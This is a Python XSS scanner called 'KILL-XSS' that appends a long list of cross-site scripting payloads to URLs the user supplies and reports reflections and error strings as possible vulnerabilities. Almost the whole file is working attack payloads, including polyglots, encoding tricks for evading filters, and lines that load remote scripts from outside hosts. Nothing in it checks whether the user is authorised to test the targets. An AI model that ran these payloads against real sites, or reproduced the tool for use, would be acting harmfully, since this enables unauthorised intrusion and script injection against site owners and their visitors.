import requests
from colorama import Fore , Style
from pyfiglet import Figlet


f = Figlet(font='Slant')
print (f.renderText('KILL-XSS'))
print(Fore.BLACK,"Dev By Captain 3xpl01t3r \n X Teambdcyberninja")



user_data = input("Enter Your Parameter urls file path: \n")

try:
     with open(user_data, "r") as file:
      targets = [line.strip() for line in file if line.strip()]
except:
     print("File Not Found!")
     exit()

xss_payloads = [
    # Basic / Polyglot
    '"><svg/onload=alert(1)>//',
    "';alert(1);//</script><svg onload=alert(1)>",
    '</script><img src=x onerror=alert(1)><!--',
    '";}</script><svg/onload=alert(1)>',
    "alert`1`",
    "alert&lpar;1&rpar;",
    "alert&#x28;1&#x29",
    "alert&#40;1&#41",
    "(alert)(1)",
    "a=alert,a(1)",
    "[1].find(alert)",
    """top["al"+"ert"](1)""",
    "top[/al/.source+/ert/.source](1)",
    "al\u0065rt(1)",
    "top['al\145rt'](1)",
    "top['al\x65rt'](1)",
    "top[8680439..toString(30)](1)",
    "navigator.vibrate(500)",
    "eval(URL.slice(-8))>#alert(1)",
    "eval(location.hash.slice(1)>#alert(1)",
    "innerHTML=location.hash>#<script>alert(1)</script>",
        """<svg onload=alert(1)>""",
    """><svg onload=alert(1)//""",
    """"onmouseover=alert(1)//""",
    """"autofocus/onfocus=alert(1)//""",
    """'-alert(1)-'""",
    """'-alert(1)//""",
    """\\'-alert(1)//""",
    """</script><svg onload=alert(1)>""",
    """<x contenteditable onblur=alert(1)>lose focus!""",
    """<x onclick=alert(1)>click this!""",
    """<x oncopy=alert(1)>copy this!""",
    """<x oncontextmenu=alert(1)>right click this!""",
    """<x oncut=alert(1)>copy this!""",
    """<x ondblclick=alert(1)>double click this!""",
    """<x ondrag=alert(1)>drag this!""",
    """<x contenteditable onfocus=alert(1)>focus this!""",
    """<x contenteditable oninput=alert(1)>input here!""",
    """<x contenteditable onkeydown=alert(1)>press any key!""",
    """<x contenteditable onkeypress=alert(1)>press any key!""",
    """<x contenteditable onkeyup=alert(1)>press any key!""",
    """<x onmousedown=alert(1)>click this!""",
    """<x onmousemove=alert(1)>hover this!""",
    """<x onmouseout=alert(1)>hover this!""",
    """<x onmouseover=alert(1)>hover this!""",
    """<x onmouseup=alert(1)>click this!""",
    """<x contenteditable onpaste=alert(1)>paste here!""",
    """<script>alert(1)//""",
    """<script>alert(1)<!–""",
    """<script src=//brutelogic.com.br/1.js>""",
    """<script src=//3334957647/1>""",
    """%3Cx onxxx=alert(1)""",
    """<%78 onxxx=1""",
    """<x %6Fnxxx=1""",
    """<x o%6Exxx=1""",
    """<x on%78xx=1""",
    """<x onxxx%3D1""",
    """<X onxxx=1""",
    """<x OnXxx=1""",
    """<X OnXxx=1""",
    """<x onxxx=1 onxxx=1""",
    """<x/onxxx=1""",
    """<x%09onxxx=1""",
    """<x%0Aonxxx=1""",
    """<x%0Conxxx=1""",
    """<x%0Donxxx=1""",
    """<x%2Fonxxx=1""",
    """<x 1='1'onxxx=1""",
    """<x 1="1"onxxx=1""",
    """<x </onxxx=1""",
    """<x 1=">" onxxx=1""",
    """<http://onxxx%3D1/""",
    """<x onxxx=alert(1) 1='""",
    """<svg onload=setInterval(function(){with(document)body.appendChild(createElement('script')).src='//HOST:PORT'},0)>""",
    """'onload=alert(1)><svg/1='""",
    """'>alert(1)</script><script/1='""",
    """*/alert(1)</script><script>/*""",
    """*/alert(1)">'onload="/*<svg/1='""",
    """`-alert(1)">'onload="`<svg/1='""",
    """*/</script>'>alert(1)/*<script/1='""",
    """<script>alert(1)</script>""",
    """<script src=javascript:alert(1)>""",
    """<iframe src=javascript:alert(1)>""",
    """<embed src=javascript:alert(1)>""",
    """<a href=javascript:alert(1)>click""",
    """<math><brute href=javascript:alert(1)>click""",
    """<form action=javascript:alert(1)><input type=submit>""",
    """<isindex action=javascript:alert(1) type=submit value=click>""",
    """<form><button formaction=javascript:alert(1)>click""",
    """<form><input formaction=javascript:alert(1) type=submit value=click>""",
    """<form><input formaction=javascript:alert(1) type=image value=click>""",
    """<form><input formaction=javascript:alert(1) type=image src=SOURCE>""",
    """<isindex formaction=javascript:alert(1) type=submit value=click>""",
    """<object data=javascript:alert(1)>""",
    """<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>""",
    """<svg><script xlink:href=data:,alert(1) />""",
    """<math><brute xlink:href=javascript:alert(1)>click""",
    """<svg><a xmlns:xlink=http://www.w3.org/1999/xlink xlink:href=?><circle r=400 /><animate attributeName=xlink:href begin=0 from=javascript:alert(1) to=&>""",
    """<html ontouchstart=alert(1)>""",
    """<html ontouchend=alert(1)>""",
    """<html ontouchmove=alert(1)>""",
    """<html ontouchcancel=alert(1)>""",
    """<body onorientationchange=alert(1)>""",
    """><img src=1 onerror=alert(1)>.gif""",
    """<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>""",
    """GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;""",
    """<script src="data:&comma;alert(1)//""",
    """><script src=data:&comma;alert(1)//""",
    """<script src="//brutelogic.com.br&sol;1.js&num;""",
    """><script src=//brutelogic.com.br&sol;1.js&num;""",
    """<link rel=import href="data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;""",
    """><link rel=import href=data:text/html&comma;&lt;script&gt;alert(1)&lt;&sol;script&gt;""",
    """<base href=//0>""",
    """<script/src="data:&comma;eval(atob(location.hash.slice(1)))//#alert(1)""",
    """<body onload=alert(1)>""",
    """<body onpageshow=alert(1)>""",
    """<body onfocus=alert(1)>""",
    """<body onhashchange=alert(1)><a href=#x>click this!#x""",
    """<body style=overflow:auto;height:1000px onscroll=alert(1) id=x>#x""",
    """<body onscroll=alert(1)><br><br><br><br>""",
    """<body onresize=alert(1)>press F12!""",
    """<body onhelp=alert(1)>press F1! (MSIE)""",
    """<marquee onstart=alert(1)>""",
    """<marquee loop=1 width=0 onfinish=alert(1)>""",
    """<audio src onloadstart=alert(1)>""",
    """<video onloadstart=alert(1)><source>""",
    """<input autofocus onblur=alert(1)>""",
    """<keygen autofocus onfocus=alert(1)>""",
    """<form onsubmit=alert(1)><input type=submit>""",
    """<select onchange=alert(1)><option>1<option>2""",
    """<menu id=x contextmenu=x onshow=alert(1)>right click me!""",
    
    """<script>alert('XSS')</script>""",
    """<scr<script>ipt>alert('XSS')</scr<script>ipt>""",
    """><script>alert('XSS')</script>""",
    """><script>alert(String.fromCharCode(88,83,83))</script>""",
    """<img src=x onerror=alert('XSS');>""",
    """<img src=x onerror=alert(String.fromCharCode(88,83,83));>""",
    """<img src=x oneonerrorrror=alert(String.fromCharCode(88,83,83));>""",
    """<img src=x:alert(alt) onerror=eval(src) alt=xss>""",
    """><img src=x onerror=alert('XSS');>""",
    """><img src=x onerror=alert(String.fromCharCode(88,83,83));>""",
    """<svgonload=alert(1)>""",
    """<svg/onload=alert('XSS')>""",
    """<svg/onload=alert(String.fromCharCode(88,83,83))>""",
    """<svg id=alert(1) onload=eval(id)>""",
    """><svg/onload=alert(String.fromCharCode(88,83,83))>""",
    """><svg/onload=alert(/XSS/)>""",
    """<body onload=alert(/XSS/.source)>""",
    """<input autofocus onfocus=alert(1)>""",
    """<select autofocus onfocus=alert(1)>""",
    """<textarea autofocus onfocus=alert(1)>""",
    """<keygen autofocus onfocus=alert(1)>""",
    """<video/poster/onerror=alert(1)>""",
    """<video><source onerror="javascript:alert(1)">""",
    """<video src=_ onloadstart="alert(1)">""",
    """<details/open/ontoggle="alert`1`">""",
    """<audio src onloadstart=alert(1)>""",
    """<marquee onstart=alert(1)>""",
    """<META HTTP-EQUIV="refresh" CONTENT="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K">""",
    """<meta/content="0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgxMzM3KTwvc2NyaXB0Pg=="http-equiv=refresh>""",
    """data:text/html,<script>alert(0)</script>""",
    """data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+""",
    """jaVasCript:/*-/*`/*\\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0D%0A//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e""",
    """ ">><marquee><img src=x onerror=confirm(1)></marquee>" ></plaintext\\></|\\><plaintext/onmouseover=prompt(1) ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->" """,
    """"></script><script>alert(1)</script>""",
    """"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>""",
    """" onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)//""",
    """';alert(String.fromCharCode(88,83,83))//""",
    """';alert(String. fromCharCode(88,83,83))//""",
    """";alert(String.fromCharCode (88,83,83))//""",
    """";alert(String.fromCharCode(88,83,83))//-- >""",
    """</SCRIPT>"><SCRIPT>alert(String.fromCharCode(88,83,83)) </SCRIPT>""",
    """javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*""",
    """javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a""",
    """javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/""",
    """javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*""",
    """javascript://'//" --></textarea></style></script></title><b onclick= alert()//>*/alert()/*""",
    """javascript://</title></textarea></style></script --><li '//" '*/alert()/*', onclick=alert()//""",
    """javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*""",
    """--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*""",
    """/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*""",
    """javascript://--></title></style></textarea></script><svg "//' onclick=alert()//""",
    """/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*""",
    """<object onafterscriptexecute=confirm(0)>""",
    """<object onbeforescriptexecute=confirm(0)>""",
    """<script>window['alert'](document['domain'])<script>""",
    """<img src='1' onerror/=alert(0) />""",
    """<script>window</script>""",
    """<script>parent</script>""",
    """<script>self</script>""",
    """<script>top</script>""",
    """<script>\\u0061\\u006C\\u0065\\u0072\\u0074(1)</script>""",
    """<img src="1" onerror="&#x61;&#x6c;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;" />""",
    """<iframe src="javascript:%61%6c%65%72%74%28%31%29"></iframe>""",
    """<img src=1 alt=al lang=ert onerror=top>""",
    """<script>$=1,alert($)</script>""",
    """<script ~~~>confirm(1)</script ~~~>""",
    """<script>$=1,\\u0061lert($)</script>""",
    """<</script/script><script>eval('\\\\u'+'0061'+'lert(1)')//</script>""",
    """<</script/script><script ~~~>\\u0061lert(1)</script ~~~>""",
    """</style></scRipt><scRipt>alert(1)</scRipt>""",
    """<iframe src=""/srcdoc='&lt;svg onload&equals;alert&lpar;1&rpar;&gt;'>""",
    
    """%3Cimg/src=%3Dx+onload=alert(2)%3D""",
    """%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%22%48%69%22%29%3b%3c%2f%73%63%72%69%70%74%3e""",
    """'%22--%3E%3C/style%3E%3C/script%3E%3Cscript%3Ealert(0x0000EB)%3C/script%3E""",
    """48e71%3balert(1)//503466e3""",
    """';confirm('XSS')//1491b2as""",
    """a29b1%3balert(888)//a62b7156d82""",
    """<scr&#x9ipt>alert('XSS')</scr&#x9ipt>""",
    """"onmouseover%3dprompt(941634)""",
    """%f6%22%20onmouseover%3dprompt(941634)%20""",
    """" onerror=alert()1 a=" """,
    """style=xss:expression(alert(1))""",
    """<input type=text value=“XSS”>""",
    """A” autofocus onfocus=alert(“XSS”)//""",
    """<input type=text value=”A” autofocus onfocus=alert(“XSS”)//”>""",
    """<a href="javascript:alert(1)">ssss</a>""",
    """+ADw-p+AD4-Welcome to UTF-7!+ADw-+AC8-p+AD4-""",
    """+ADw-script+AD4-alert(+ACc-utf-7!+ACc-)+ADw-+AC8-script+AD4-""",
    """+ADw-script+AD4-alert(+ACc-xss+ACc-)+ADw-+AC8-script+AD4-""",
    """<%00script>alert(‘XSS’)<%00/script>""",
    """<%script>alert(‘XSS’)<%/script>""",
    """<%tag style=”xss:expression(alert(‘XSS’))”>""",
    """<%tag    onmouseover="(alert('XSS'))"> is invalid. <%br />""",
    """</b style="expr/**/ession(alert('vulnerable'))">""",
    """'';!--"<XSS>=&{()}""",
    """<SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT>""",
    """<IMG SRC="javascript:alert('XSS');">""",
    """<IMG SRC=javascript:alert('XSS')>""",
    """<IMG SRC=JaVaScRiPt:alert('XSS')>""",
    """<IMG SRC=`javascript:alert("RSnake says, 'XSS'")`>""",
    """<IMG "><SCRIPT>alert("XSS")</SCRIPT>">""",
    """<IMG SRC=javascript:alert(String.fromCharCode(88,83,83))>""",
    """<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>""",
    """<IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29>""",
    """<IMG SRC="jav    ascript:alert('XSS');">""",
    """<IMG SRC="jav&#x09;ascript:alert('XSS');">""",
    """<IMG SRC="jav&#x0A;ascript:alert('XSS');">""",
    """<IMG SRC="jav&#x0D;ascript:alert('XSS');">""",
    """<SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT>""",
    """<BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert("XSS")>""",
    """<<SCRIPT>alert("XSS");//<</SCRIPT>""",
    """<iframe src=http://ha.ckers.org/scriptlet.html <""",
    """<SCRIPT>a=/XSS/;alert(a.source)</SCRIPT>""",
    """\\";alert('XSS');//""",
    """</TITLE><SCRIPT>alert("XSS");</SCRIPT>""",
    """<INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');">""",
    """<BODY BACKGROUND="javascript:alert('XSS')">""",
    """<BODY ONLOAD=alert('XSS')>""",
    """<IMG DYNSRC="javascript:alert('XSS')">""",
    """<IMG LOWSRC="javascript:alert('XSS')">""",
    """<BGSOUND SRC="javascript:alert('XSS');">""",
    """<LINK REL="stylesheet" HREF="javascript:alert('XSS');">""",
    """<STYLE>@import'http://ha.ckers.org/xss.css';</STYLE>""",
    """<STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE>""",
    """<STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE>""",
    """<META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');">""",
    """<IFRAME SRC="javascript:alert('XSS');"></IFRAME>""",
    """<DIV STYLE="background-image: url(javascript:alert('XSS'))">""",
    """<DIV STYLE="width: expression(alert('XSS'));">""",
    """<STYLE TYPE="text/javascript">alert('XSS');</STYLE>""",
    """<!--[if gte IE 4]><SCRIPT>alert('XSS');</SCRIPT><![endif]-->""",
    """<BASE HREF="javascript:alert('XSS');//">""",
    """<OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT>""",
    """<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>""",
    """<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">""",
    """<SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT>""",
    """<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>""",
    """<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>""",
    """<xss STYLE="behavior: url(xss.htc);">""",
    """\\x3c""",
    """\\u003c""",
    """\\u003C""",
    """jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e""",
    """';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>""",
    """“ onclick=alert(1)//<button ‘ onclick=alert(1)//> */ alert(1)""",
    """'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23x29;>'"><img src="http://i.imgur.com/P8mL8.jpg">""",
    """javascript://'/</title></style></textarea></script>--><p" onclick=alert()//>*/alert()/*""",
    """javascript://--></script></title></style>"/</textarea>*/<alert()/*' onclick=alert()//>a""",
    """javascript://</title>"/</script></style></textarea/-->*/<alert()/*' onclick=alert()//>/""",
    """javascript://</title></style></textarea>--></script><a"//' onclick=alert()//>*/alert()/*""",
    """javascript:alert()//--></script></textarea></style></title><a"//' onclick=alert()//>*/alert()/*""",
    """--></script></title></style>"/</textarea><a' onclick=alert()//>*/alert()/*""",
    """/</title/'/</style/</script/</textarea/--><p" onclick=alert()//>*/alert()/*""",
    """javascript://--></title></style></textarea></script><svg "//' onclick=alert()//""",
    """/</title/'/</style/</script/--><p" onclick=alert()//>*/alert()/*""",
    """JavaScript://%250Aalert?.(1)//'/*\'/*"/*\"/*`/*\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\74k<K/contentEditable/autoFocus/OnFocus=/*${/*/;{/**/(alert)(1)}//><Base/Href=//X55.is\76-->""",




    # Obfuscated
    '<svg><script>alert&#40;1&#41;</script>',
    "<img src=x onerror=window>",
    "<svg onload=top>",

    # Attribute-based
    '" autofocus onfocus=alert(1) x="',
    '" onpointerenter=alert(1) x="',

    # Encoding / URL-safe
    '%22%3E%3Csvg%20onload%3Dalert(1)%3E',
    '%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E',

    # DOM XSS (SPA / hash / search)
    '#"><svg onload=alert(1)>',
    "?x=%3Csvg/onload=alert(1)%3E",
    "';location.hash&&alert(1);//"
]


ERROR_KEYWORDS = [
    "error", "exception", "warning", "fatal", "traceback",
    "internal server error", "sql syntax", "mysql", "oracle",
    "postgres", "sqlite", "unterminated string",
    "template error", "jinja", "twig", "expression",
    "no such file", "failed to open", "permission denied",
    "access denied", "unauthorized", "forbidden",
    "invalid json", "parse error", "unexpected token",
    "connection refused", "timeout"
]

header = {
    "User-Agent":"Mozilla/5.0",
    "User-Agent":"Team-Ghost/1.0"
}


print(Fore.CYAN,"[+]",Fore.RED,"[INFO]",Fore.BLUE,"Scanning please wait for result!")
print (f"""------------------------------------------------------------------------------------------------------\n
                   Total Payload Loaded: {len(xss_payloads)}\n----------------------------------------------------------------------------------------------""")

for payloads in xss_payloads:
    for target in targets:
        final_p = target+payloads
        try:
           org_get = requests.get(target,
                                  headers=header, 
                                  timeout=5)
           org_len = len(org_get.text)

           main_get = requests.get(final_p,
                                   headers=header,
                                   timeout=5)
           main_len = len(main_get.text)
           

           if org_len != main_len:
                    if payloads in main_get.text:
                     print(Fore.CYAN,"[+]",Fore.RED,"INFO",Fore.GREEN,"XSS Triggered Possible XSS vulnerable","\n",
                        "URL:",target,"\n"
                        "Payload:",payloads, "\n"
                        "Status Code (If Defferece From 200 Please check manually):",main_get.status_code, "\n"
                        "Length :", main_len, "\n")
                     
           for error in ERROR_KEYWORDS:
             if error in main_get.text:
                  print(Fore.CYAN,"[+]",Fore.RED,"INFO","Possible XSS Detected with error key, Manual Check required","\n","URL:",target,
                         "\n","Payload:",payloads)
                    

        except:
           print("Good Bye")
           exit()